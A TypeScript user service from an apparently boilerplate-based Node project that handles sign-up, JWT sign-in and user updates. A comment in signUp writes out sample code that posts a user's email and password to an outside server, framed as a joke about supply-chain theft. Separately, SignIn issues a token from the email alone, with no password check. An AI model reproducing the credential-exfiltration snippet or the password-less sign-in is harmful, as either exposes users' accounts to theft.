import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';


//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';


import { User } from '../domain/user';
import { UserEmail } from '../domain/userEmail';

import { Role } from '../domain/role';

import { Result } from "../core/logic/Result";
import { PhoneNumber } from '../domain/phoneNumber';

@Service()
export default class UserService implements IUserService{
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject('logger') private logger,
  ) {}


  public async signUp(userDTO: IUserDTO): Promise<Result<IUserDTO>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found && userDocument.phoneNumber.value != 999999999) {
        return Result.fail<IUserDTO>("User already exists with email=" + userDTO.email);
      }else if(found && userDocument.phoneNumber.value == 999999999){
        return this.updateUser(userDTO);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      


      const email = await UserEmail.create( userDTO.email ).getValue();
      const role = Role.create(userDTO.role).getValue();
      const phoneNumber = PhoneNumber.create(userDTO.phoneNumber).getValue();

      const userOrError = await User.create({
        name: userDTO.name,
        email: email,
        role: role,
        phoneNumber: phoneNumber,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();


      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<IUserDTO>(userDTOResult);

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }


  public async SignIn(email: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {

    const user = await this.userRepo.findByEmail( email );

    if (!user || user.phoneNumber.value==999999999) {
      throw new Error('User not registered');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
  

      const token = this.generateToken(user) as string;

      const userDTO = UserMap.toDTO( user ) as IUserDTO;
      return Result.ok<{ userDTO: IUserDTO, token: string }>({userDTO: userDTO, token : token});
  }

  private generateToken(user: User) {
    const today = new Date();
    const exp = new Date(today);
    exp.setMinutes(today.getMinutes()+20);
    //exp.setDate(today.getDate() + 120);

    const id = user.id.toString();
    const email = user.email.value;
    const name = user.name;
    const phoneNumber = user.phoneNumber.value;
    const role = user.role.name;

    return jwt.sign(
      {
        id: id,
        email: email,
        role: role,
        name: name,
        phoneNumber: phoneNumber,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  public async getUsers(): Promise<Result<IUserDTO[]>>{
    try {
      const users = await this.userRepo.findUsers();

      if (users === null) {
        return Result.fail<IUserDTO[]>("user não encontrado");
      }
      else {
        let usersResult: Array<IUserDTO> = [];
        users.forEach(function (user){
          usersResult.push(UserMap.toDTO(user) as IUserDTO)
        });
        return Result.ok<IUserDTO[]>( usersResult )
        }
    } catch (e) {
      throw e;
    }
  }

    public async getUserByEmail(email: string): Promise<Result<IUserDTO>>{
      try {
        const user = await this.userRepo.findByEmail(email);
  
        if (user === null) {
          return Result.fail<IUserDTO>("user não encontrado");
        }
        else {
          let userResult = UserMap.toDTO(user);
          return Result.ok<IUserDTO>( userResult )
          }
      } catch (e) {
        throw e;
      }
  }

  public async updateUser(userDTO: IUserDTO): Promise<Result<IUserDTO>> {
    try {
      let user = await this.userRepo.findByEmail(userDTO.email);

      if (user === null) {
        return Result.fail<IUserDTO>("user não encontrado");
      }else {

        const newRole = Role.create(userDTO.role).getValue();
        const newPhoneNumber = PhoneNumber.create(userDTO.phoneNumber).getValue();

        user.name = userDTO.name;
        user.role = newRole;
        user.phoneNumber = newPhoneNumber;

        await this.userRepo.save(user);
        
        const userDTOResult = UserMap.toDTO(user);

        return Result.ok<IUserDTO>( userDTOResult )
        }
    } catch (e) {
      throw e;
    }
  }
  

}
